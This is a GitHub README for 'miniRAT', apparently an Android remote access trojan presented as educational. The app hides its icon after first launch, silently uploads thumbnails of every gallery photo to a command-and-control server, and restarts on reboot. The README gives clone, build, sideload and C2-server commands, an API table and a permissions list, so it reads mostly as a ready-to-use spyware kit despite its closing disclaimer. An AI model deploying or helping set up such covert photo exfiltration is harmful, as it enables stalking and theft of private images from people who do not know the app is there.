<div align="center">

# 🐀 miniRAT

**A minimal, educational Android Remote Access Trojan**

*Stealth gallery exfiltration • One-time silent scan • Auto-hide from launcher*

[![Android](https://img.shields.io/badge/Android-API%2021+-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)
[![Node.js](https://img.shields.io/badge/Node.js-16+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](LICENSE)
[![Java](https://img.shields.io/badge/Java-Android%20SDK-007396?style=for-the-badge&logo=openjdk&logoColor=white)](https://www.java.com)

---

*miniRAT demonstrates how a covert Android app can silently scan a device's gallery, generate thumbnails of every photo, and exfiltrate them to a remote command-and-control server — all while remaining invisible to the user.*

</div>

---

## ⚡ How It Works

```
📱 Target Device                          🖥️ C2 Server
                                          
 ┌─────────────────┐                      ┌──────────────────────┐
 │  App installed   │                      │  node server.js      │
 │  (sideloaded)    │                      │  Listening on :3000   │
 └────────┬────────┘                      └──────────┬───────────┘
          │                                          │
          ▼                                          │
 ┌─────────────────┐                                 │
 │  First Launch    │                                 │
 │  ─────────────── │                                 │
 │  • Permission    │                                 │
 │    dialog shown  │                                 │
 │  • Service starts│                                 │
 │  • Icon vanishes │                                 │
 │    from drawer   │                                 │
 └────────┬────────┘                                 │
          │                                          │
          ▼                                          │
 ┌─────────────────┐          HTTPS POST             │
 │  Silent Scan     │    /api/upload/thumbnail        │
 │  ─────────────── │ ──────────────────────────────▶ │
 │  • All photos    │    { filename, thumbnail }      │
 │  • All formats   │                                 │
 │  • 128×128 thumb │                                 │
 │  • Base64 + JSON │        200 OK                   │
 │                  │ ◀────────────────────────────── │
 └────────┬────────┘                                 │
          │                                          │
          ▼                                          ▼
 ┌─────────────────┐                      ┌──────────────────────┐
 │  Stays alive     │                      │  Gallery Dashboard   │
 │  Re-scans on     │                      │  http://server:3000  │
 │  every reboot    │                      │  Auto-refresh 30s    │
 └─────────────────┘                      └──────────────────────┘
```

---

## 🔥 Features

<table>
<tr>
<td width="50%">

### 📱 Android Client
- **Zero-UI** — No visible interface, ever
- **Auto-hide** — Disappears from app drawer after first launch
- **All image formats** — JPEG, PNG, WEBP, GIF, HEIC, BMP...
- **Memory-safe** — Downsampled decoding with `inSampleSize`
- **Boot persistence** — Restarts automatically on reboot
- **Foreground service** — Won't be killed by Android 8+
- **Scoped storage** — Works on Android 10+ (ContentURIs)
- **Runtime permissions** — Handles Android 6-14 cleanly

</td>
<td width="50%">

### 🖥️ C2 Server
- **Express.js** — Lightweight thumbnail receiver
- **Gallery dashboard** — Web viewer with auto-refresh
- **Metadata tracking** — Timestamps + original filenames
- **File storage** — Thumbnails saved as JPEG on disk
- **REST API** — Upload, list, serve endpoints
- **CORS enabled** — Cross-origin ready

</td>
</tr>
</table>

---

## 🚀 Quick Start

### 1. Clone & Configure

```bash
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT
```

Set your C2 server URL:

```bash
echo "DOMAIN_URL=https://your-server.com" > app/local.properties
```

### 2. Start the C2 Server

```bash
npm install express cors multer
node server.js
```

```
🐀 RAT server running at http://localhost:3000
```

### 3. Build & Deploy the APK

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

> Or open in **Android Studio** → Build → Build APK

### 4. First Launch

Tap the app icon once. A permission dialog appears. Grant it. The app icon disappears. Thumbnails start flowing to your C2 dashboard.

---

## 📁 Project Structure

```
miniRAT/
│
├── 📱 app/src/main/
│   ├── AndroidManifest.xml           # Permissions & components
│   └── java/com/app/minirat/
│       ├── HiddenActivity.java       # Permission → Service → Hide → Finish
│       ├── Service.java              # Gallery scan → Thumbnail → Upload
│       └── BootReceiver.java         # Auto-restart on reboot
│
├── 🖥️ server.js                      # C2 server (Express.js)
├── 🔧 app/local.properties           # DOMAIN_URL config
│
└── 📚 .claude/                        # Detailed documentation
    ├── README.md
    ├── ARCHITECTURE.md
    ├── ANALYSIS.md
    └── CONTEXT.md
```

---

## 🔑 Permissions

| Permission | Android Version | Purpose |
|:---|:---|:---|
| `INTERNET` | All | Upload thumbnails |
| `READ_EXTERNAL_STORAGE` | 5.0 – 12 | Access gallery |
| `READ_MEDIA_IMAGES` | 13+ | Access gallery (replaces above) |
| `RECEIVE_BOOT_COMPLETED` | All | Boot persistence |
| `FOREGROUND_SERVICE` | 8+ | Background execution |
| `ACCESS_NETWORK_STATE` | All | Connectivity check |

---

## 🌐 API Reference

| Method | Endpoint | Description |
|:---|:---|:---|
| `POST` | `/api/upload/thumbnail` | Upload `{ filename, thumbnail }` |
| `GET` | `/api/thumbnails` | List all (newest first) |
| `GET` | `/api/fullsize/:file` | Serve full-size file |
| `GET` | `/` | Gallery dashboard |

---

## 🛡️ Lifecycle

```
Install → First Launch → Permission → Service → Hide Icon
                                         │
                                    One-time Scan
                                    (all gallery images)
                                         │
                                    Upload to C2
                                         │
                                    Service stays alive
                                         │
                              ┌──────────┴──────────┐
                              │                     │
                         Reboot?              Killed by OS?
                              │                     │
                      BootReceiver            START_STICKY
                              │                     │
                      Re-scan gallery       OS restarts service
```

---

## ⚠️ Disclaimer

> **This project is strictly for educational and authorized security research purposes.**
>
> Unauthorized access to computer systems and data exfiltration is **illegal** under computer crime laws in most jurisdictions. This software must only be installed on devices you own or have **explicit written authorization** to test.
>
> The author assumes **no liability** for misuse of this software.

---

<div align="center">

**Built for learning. Use responsibly.**

</div>
